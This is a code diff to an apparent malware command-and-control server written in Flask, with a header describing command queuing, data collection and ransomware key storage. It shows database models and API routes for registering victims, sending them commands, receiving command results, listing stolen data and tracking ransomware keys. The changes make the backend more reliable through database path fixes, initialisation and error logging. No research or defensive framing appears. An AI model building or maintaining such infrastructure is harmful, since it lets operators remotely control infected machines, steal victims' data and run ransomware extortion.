@@ -9,6 +9,7 @@ command queuing, data collection, and ransomware key storage.
 import json
 import secrets
 import logging
+import os
 from datetime import datetime
 
 from flask import Flask, request, jsonify, render_template
@@ -19,7 +20,8 @@ from flask_sqlalchemy import SQLAlchemy
 # ------------------------------------------------------------------
 class Config:
     SECRET_KEY = secrets.token_hex(32)
-    SQLALCHEMY_DATABASE_URI = 'sqlite:///c2_database.db'
+    # Use absolute path to instance folder for reliability
+    SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(os.path.abspath('instance'), 'c2_database.db')
     SQLALCHEMY_TRACK_MODIFICATIONS = False
     DEBUG = False
     HOST = '0.0.0.0'
@@ -29,6 +31,10 @@ logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(m
 
 app = Flask(__name__)
 app.config.from_object(Config)
+
+# Ensure instance folder exists
+os.makedirs(os.path.join(app.root_path, 'instance'), exist_ok=True)
+
 db = SQLAlchemy(app)
 
 # ------------------------------------------------------------------
@@ -80,6 +86,21 @@ class RansomwareKey(db.Model):
     files_encrypted = db.Column(db.Integer, default=0)
     created_at = db.Column(db.DateTime, default=datetime.now)
     updated_at = db.Column(db.DateTime, default=datetime.now, onupdate=datetime.now)
+
+# ------------------------------------------------------------------
+# Database Initialization
+# ------------------------------------------------------------------
+with app.app_context():
+    try:
+        db.create_all()
+        # Quick check if victims table exists
+        result = db.session.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='victims';").fetchone()
+        if result:
+            logging.info("✅ Database initialized successfully. Victims table exists.")
+        else:
+            logging.warning("⚠️ Victims table not found after create_all. Check database path.")
+    except Exception as e:
+        logging.error(f"❌ Database initialization error: {e}")
 
 # ------------------------------------------------------------------
 # Helper: update victim last_seen
@@ -215,6 +236,7 @@ def get_command():
             return jsonify({'has_command': True, 'command': cmd.command, 'command_id': cmd.id})
         return jsonify({'has_command': False})
     except Exception as e:
+        logging.error(f"Get command error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/command_result', methods=['POST'])
@@ -234,6 +256,7 @@ def command_result():
         else:
             return jsonify({'status': 'error', 'message': 'Command not found'}), 404
     except Exception as e:
+        logging.error(f"Command result error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/send_command', methods=['POST'])
@@ -250,6 +273,7 @@ def send_command():
         logging.info(f"Command queued for {vid}: {cmd_text[:50]}")
         return jsonify({'status': 'queued', 'command_id': cmd.id})
     except Exception as e:
+        logging.error(f"Send command error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/victims', methods=['GET'])
@@ -276,6 +300,7 @@ def get_victims():
             } for v in victims]
         })
     except Exception as e:
+        logging.error(f"Get victims error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/victim/<victim_id>', methods=['GET'])
@@ -313,6 +338,7 @@ def get_victim(victim_id):
             } for c in commands]
         })
     except Exception as e:
+        logging.error(f"Get victim error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/ransomware/<victim_id>', methods=['GET'])
@@ -335,6 +361,7 @@ def get_ransomware_status(victim_id):
             })
         return jsonify({'exists': False})
     except Exception as e:
+        logging.error(f"Ransomware status error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/stats', methods=['GET'])
@@ -347,6 +374,7 @@ def get_stats():
             'total_data': CollectedData.query.count()
         })
     except Exception as e:
+        logging.error(f"Stats error: {e}")
         return jsonify({'error': str(e)}), 500
 
 # ------------------------------------------------------------------
